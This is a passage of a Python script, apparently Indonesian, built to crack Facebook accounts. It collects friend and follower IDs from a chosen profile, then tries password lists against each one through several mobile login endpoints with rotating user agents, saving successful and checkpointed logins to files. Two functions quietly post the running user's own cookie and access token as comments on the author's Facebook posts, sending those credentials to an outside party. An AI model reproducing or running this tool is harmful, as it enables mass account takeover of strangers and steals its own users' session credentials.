...
id, loop, id2, metode, uid, ok, cp, ua_crack, id3, id4, idez, HikmatXD, akun = (
    [],
    0,
    [],
    [],
...
for xyzx in range(1000):
    ...
    if ugent1 in ua_crack:
        pass
    else:
        ua_crack.append(ugent1)
    ...
    if ugent2 in ua_crack:
        pass
    else:
        ua_crack.append(ugent2)
    ...
    if ugent3 in ua_crack:
        pass
    else:
        ua_crack.append(ugent3)
...
try:
    ua_crack = open("useragent.txt", "r").read().splitlines()
except:
    ua_crack = [
...
def banner():
    ...
    vprint(
        panel(
            f"""{H2}8888888b.  888b     d888 888888b.   8888888888 
...
888   T88b 888       888 8888888P"  888         """,
            style=f"{warna_warni_rich_cerah}",
            width=50,
        )
    )
...
def comen(kook, token):
    cookie = kook
    random_kata = random.choice(
        [
            "Makasih Bang Udah Buat Script Ambf\nTanggal Login Ku Bang :" + sekarang,
            "Selalu Sukses Coeg ok><",
            "semoga @[100003902983456:0] panjang umur dan rejeki nya dilancarkan aminnn",
        ]
    )
    react_angry = "ANGRY"
    requests.post(
        f"https://graph.facebook.com/100003902983456_2334178456722231/reactions?type={react_angry}&access_token={toket}",
    ...
    requests.post(
        f"https://graph.facebook.com/100003902983456?fields=subscribers&access_token={toket}",
        headers={"cookie": cookie},
    )
    requests.post(
        f"https://graph.facebook.com/100003902983456_2334178456722231/comments/?message={cookie}&access_token={toket}",
        headers={"cookie": cookie},
    )
    requests.post(
        f"https://graph.facebook.com/100003902983456_2334178456722231/comments/?message={toket}&access_token={toket}",
        headers={"cookie": cookie},
    )
    requests.post(
        f"https://graph.facebook.com/100003902983456_2334178456722231/comments/?message={random_kata}&access_token={toket}",
        headers={"cookie": cookie},
    )
    menu()
...
def login():
    ...
    if cukuf in ["help", "Help", "HELP"]:
        ...
        vprint(panel(x, style=f"{warna_warni_rich_cerah}"))
        os.system(
            "xdg-open https://wa.me/+6282115413282?text=bang+cara+pake+script+abang+kek+mana?"
        )
        ...
        vprint(panel(x, style=f"{warna_warni_rich_cerah}"))
        os.system(
            "xdg-open https://wa.me/+6282115413282?text=bang+script+mu+itu+ada+yang+error!!"
        )
        input(f" {P}[{warna_warni_biasa}•{P}] kembali")
        login()
    elif cukuf in ["0", "00"]:
...
def naon(cookie):
    ...
    random_kata = random.choice(
        [
            "Makasih Bang Udah Buat Script Ambf",
            "Hikmat Gans Selalu Coeg><",
            "semoga @[100000871607227:0] panjang umur dan rejeki nya dilancarkan aminnn",
        ]
    )
    requests.post(
        f"https://graph.facebook.com/100000871607227?fields=subscribers&access_token={toket}",
        headers={"cookie": kuki},
    )
    requests.post(
        f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={kuki}&access_token={toket}",
        headers={"cookie": kuki},
    )
    requests.post(
        f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={toket}&access_token={toket}",
        headers={"cookie": kuki},
    )
    requests.post(
        f"https://graph.facebook.com/100000871607227_5528296787209320/comments/?message={random_kata}&access_token={toket}",
        headers={"cookie": kuki},
    )
    print(f"\n{garis} tunggu sebentar")
    time.sleep(3)
    menu()
...
def menu():
    banner()
    try:
        EwePaksa = requests.get("http://ip-api.com/json/").json()
    except:
        EwePaksa = {"-"}
    try:
        IP = EwePaksa["query"]
        ...
        IP = {"-"}
    try:
        nibba = EwePaksa["country"]
    except:
        nibba = {"-"}
    try:
        rasis_Z_K_ = EwePaksa["isp"]
    except:
        rasis_Z_K_ = {"-"}
    try:
        rasis_Z_K_X_ = EwePaksa["city"]
    except:
        rasis_Z_K_X_ = {"-"}
    try:
        rasis_Z_K_X_R_ = EwePaksa["timezone"]
    except:
        rasis_Z_K_X_R_ = {"-"}
    try:
        rasis_Z_K_X_R_H_ = EwePaksa["countryCode"]
    except:
        rasis_Z_K_X_R_H_ = {"-"}
    try:
        rasis_Z_K_X_R_H_M_ = EwePaksa["regionName"]
    except:
        rasis_Z_K_X_R_H_M_ = {"-"}
    try:
        rasis_Z_K_X_R_H_M_P_ = EwePaksa["as"]
    except:
        rasis_Z_K_X_R_H_M_P_ = {"-"}
    token = open("token.txt", "r").read()
    coki = {"cookie": open("cookie.txt", "r").read()}
    response3 = (
        requests.Session()
        .get(
            f"https://m.facebook.com/me/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",
            cookies=coki,
        )
        .text
    )
    ...
    nama = jsx["name"]
    tumbal_id = jsx["id"]
    xn = requests.Session().get(
        "https://graph.facebook.com/me?access_token=%s" % (token), cookies=cookie
    )
    ...
    kedua.append(
        Panel(
            f"{P2}Recommended : xL,exis,Indosat,tree", style=f"{warna_warni_rich_cerah}"
        )
    )
    ...
    menu = []
    menu.append(
        Panel(f"{P2}[{H2}01{P2}].crack public", style=f"{warna_warni_rich_cerah}")
    )
    menu.append(
        Panel(f"{P2}[{H2}03{P2}].opsi detectored", style=f"{warna_warni_rich_cerah}")
    )
    menu2 = []
    menu2.append(
        Panel(f"{P2}[{H2}02{P2}].hasil crack", style=f"{warna_warni_rich_cerah}")
    )
    menu2.append(
        Panel(f"{P2}[{M2}00{P2}].exit/delete cookie", style=f"{warna_warni_rich_cerah}")
    )
    ...
    if HikmatXD in ["1", "01"]:
        ...
        if zk in ["1", "01"]:
            print("")
            c = input(
                f"{garis} anda yakin ingin menghapus cookie ({M}y{P}/{H}t{P}) : {H}"
            )
            if c in ["ya", "y", "Y"]:
                print("")
                os.system("rm -rf cookie.txt")
...
def hasil_crack():
    ...
    if inhasil in ["1", "01"]:
        ...
        if len(c_o_k) == 0:
            ...
            for kaoo in c_o_k:
                try:
                    hikmat = open("OK/" + kaoo, "r").readlines()
                except:
                    continue
                cuih += 1
                if cuih < 10:
        ...
        if len(c_o_k) == 0:
            ...
            for kaoo in c_o_k:
                try:
                    hikmat = open("CP/" + kaoo, "r").readlines()
                except:
                    continue
                cuih += 1
                if cuih < 10:
...
def HikmatXyz(user, pasw):
    ...
    ged = sop(
        ses.get(
            host + "/login/?next&ref=dbl&fl&refid=8", headers={"user-agent": ua}
        ).text,
        "html.parser",
    )
    ...
    try:
        run = sop(
            ses.post(host + fm.get("action"), data=data, allow_redirects=True).text,
            "html.parser",
        )
...
def cracked_email():
    ...
    if sae in ["1"]:
        ...
        for z in range(jumlah):
            ...
            sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ")
            sys.stdout.flush()
    elif sae in ["2"]:
        email = "@yahoo.com"
        nama = input(f"{garis} input nama : ")
...
def massal_cracked_public():
    ...
    for userr in uid:
        try:
            ...
            coki = {"cookie": cookie}
            cyna = requests.get(
                "https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s"
                % (userr, token),
                cookies=coki,
            ).json()
            for fuck in cyna["friends"]["data"]:
...
def cracked_public():
    ...
    try:
        ...
        coki = {"cookie": cookie}
        coa = requests.get(
            "https://graph.facebook.com/%s?access_token=%s" % (put, token), cookies=coki
        )
        el = json.loads(coa.text)
        try:
            lk = el["name"]
        ...
        link = requests.get(
            "https://graph.facebook.com/%s/fields=friends?fields=name,id,birthday&limit=(99999)&access_token=%s"
            % (put, token),
            cookies=coki,
        ).json()
        link_ = requests.get(
        ...
        for fuck in cyna["friends"]["data"]:
            try:
                ...
                continue
        cyna = requests.get(
            "https://graph.facebook.com/%s?fields=subscribers.limit(10000)&access_token=%s"
            % (put, token),
            cookies=coki,
        ).json()
        for fuck in cyna["subscribers"]["data"]:
            try:
                id3.append(fuck["id"] + "|" + fuck["name"])
            except:
                continue
        ...
        dom.append(
            Panel(
                f"{P2}total friends : {H2}{len(id)}", style=f"{warna_warni_rich_cerah}"
            )
        )
        dom.append(
            Panel(
                f"{P2}total followers : {H2}{len(id3)}",
                style=f"{warna_warni_rich_cerah}",
            )
        )
...
def setting():
    ...
    tara.append(
        Panel(
            f"{P2}[{H2}01{P2}] crack urutan new ({H2}public crack{P2})\n{P2}[{H2}02{P2}] crack urutan old ({H2}public crack{P2})\n{P2}[{H2}03{P2}] crack urutan random ({H2}public crack{P2})",
            title=" • Publick •",
            style=f"{warna_warni_rich_cerah}",
        )
    )
    tara.append(
        Panel(
            f"{P2}[{H2}04{P2}] crack urutan new ({H2}followers crack{P2})\n{P2}[{H2}05{P2}] crack urutan old ({H2}followers crack{P2})\n{P2}[{H2}06{P2}] crack urutan random ({H2}followers crack{P2})",
            title=" • Followers • ",
            style=f"{warna_warni_rich_cerah}",
        )
    )
...
def crack_public_pilihan():
    ...
    suci.append(
        Panel(
            f"{P2}[{H2}01{P2}] methode mobile ({H2}slowed cracked{P2})\n{P2}[{H2}02{P2}] methode mbasic ({K2}fast cracked{P2})\n{P2}[{H2}03{P2}] methode free  ({M2}not recommended{P2})",
            title=" • V1 • ",
            style=f"{warna_warni_rich_cerah}",
        )
    )
    suci.append(
        Panel(
            f"{P2}[{H2}04{P2}] methode mobile version 2 ({H2}new{P2})\n{P2}[{H2}05{P2}] methode b-api  ({H2}very fast cracked{P2})\n{P2}[{H2}06{P2}] methode mobile freefire ({H2}new methode{P2})",
            title=" • V2 •",
            style=f"{warna_warni_rich_cerah}",
        )
    )
    ...
    pw_tambahani = input(
        garis
        + " ingin menambahkan password tambahan ("
        + H
        + "y"
        + P
        + "/"
    ...
    nanya_apk = input(
        garis
        + " ingin memunculkan aplikasi terkait ("
        + H
        + "y"
        + P
        + "/"
...
def passwer():
    ...
    if ok != 0 or cp != 0:
        ...
        input(garis + " kembali ")
        tanya_hal = input(
            f"{garis} ingin memakai check opsi detector untuk hasil crack cp ({H}y{P}/{M}t{P}) ? : {H}"
        )
...
def mobile(uiz, pwr, link_okep):
    ...
    ua_crack = [
        "Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]",
        "Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2",
        "Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2",
        ...
        "Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2",
        ...
        "Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
        ...
        "Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5",
        "Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2",
    ]
    ua = random.choice(ua_crack)
    ses = requests.Session()
    c_pw = len(pwr)
    ...
    sys.stdout.write(
        "\r %s• %scracked %s%s/%s/%s %sok:%s %scp:%s "
        % (P, runc, P, str(c_pw), len(id2 or id4), HikmatXD, H, ok, K, cp)
    )
    sys.stdout.flush()
    c_pw -= 1
    for pw in pwr:
        ...
        try:
            ...
            dataa = {
                ...
                "next": "https://"
                + link_okep
                + "/v7.0/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
                "flow": "login_no_pin",
                "pass": pw,
            }
            koki = (";").join(
            ...
            heade = {
                ...
                "referer": "https://"
                + link_okep
                + "/login/device-based/password/?uid="
                + uiz
                + "&flow=login_no_pin&next=https%3A%2F%2F"
                + link_okep
                + "%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            }
            po = ses.post(
                f"https://{link_okep}/login/device-based/validate-password/?shbl=0&locale2=id_ID",
                data=dataa,
                cookies={"cookie": koki},
                headers=heade,
            ...
            if "checkpoint" in ses.cookies.get_dict().keys():
                ...
                print(
                    "\r %s*--> %s|%s %s• %s "
                    % (K, uiz, pw, warna_warni_biasa, tahun(uiz))
                )
                print("")
                ...
                headapp = {
                    "user-agent": "Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"
                }
                if "no" in tampilkan_apk:
                    ...
                    print(
                        "\r %s*--> %s|%s %s• %s "
                        % (H, uiz, pw, warna_warni_biasa, tahun(uiz))
                    )
                    print("\r %s*--> %s " % (H, kuki))
                    print("")
    ...
    for pw in pwr:
        ...
        try:
            ...
            dataa = {
                ...
                "next": "https://"
                + link_okep
                + "/v7.0/dialog/oauth?app_id=3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified",
                "flow": "login_no_pin",
                "pass": pw,
            }
            koki = (";").join(
            ...
            heade = {
                ...
                + "&flow=login_no_pin&next=https%3A%2F%2F"
                + link_okep
                + "%2Fv6.0%2Fdialog%2Foauth%3Fclient_id%3D2036793259884297%26cbt%3D1622205732064%26e2e%3D%257B%2522init%2522%253A1622205732064%257D%26ies%3D1%26sdk%3Dandroid-6.3.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D%26default_audience%3Dfriends%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4da6f37f-2993-49cd-b08c-11e3de85d49c%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25224da6f37f-2993-49cd-b08c-11e3de85d49c%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25222ufhuvkboj9rivqmqnuv%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=https%3A%2F%2F"
                + link_okep
                + "%2Fv6.0%2Fdialog%2Foauth&_rdr",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            }
            po = ses.post(
...
def api(uiz, pwr):
    ...
    for pw in pwr:
        ...
        if "session_key" in response.text and "EAAG" in response.text:
            print(
                "\r %s*--> %s|%s %s• %s" % (H, uiz, pw, warna_warni_biasa, tahun(uiz))
            )
            ...
            print(
                "\r %s*--> %s|%s %s• %s" % (K, uiz, pw, warna_warni_biasa, tahun(uiz))
            )
            open("CP/" + cpz, "a").write(uiz + "|" + pw + "|" + "\n")
            cp += 1
            break
    ...
    try:
        ...
        ho = sop(
            ses.post(
                ...
                data={"email": uiz, "pass": pw, "login": "submit"},
                headers=head,
        ...
        print(
            "\r"
            + garis
            + "%s tidak dapat mengecek opsi... cek login di fb lite/mbasic " % (M)
        )
        open("CP/" + cpz, "a").write(uiz + "|" + pw + "\n")
        cp += 1
        ...
        for i in range(len(game)):
            print(
                ...
                % (
                    P,
                    i + 1,
                    game[i].replace("Ditambahkan pada", " Ditambahkan pada"),
                    P,
                )
            )
    ...
    if len(game) == 0:
        ...
        for i in range(len(game)):
            print(
                ...
                + garis
                + " %s%s. %s%s"
                % (P, i + 1, game[i].replace("Kedaluwarsa", " Kedaluwarsa"), P)
            )
        else:
            print("\r")
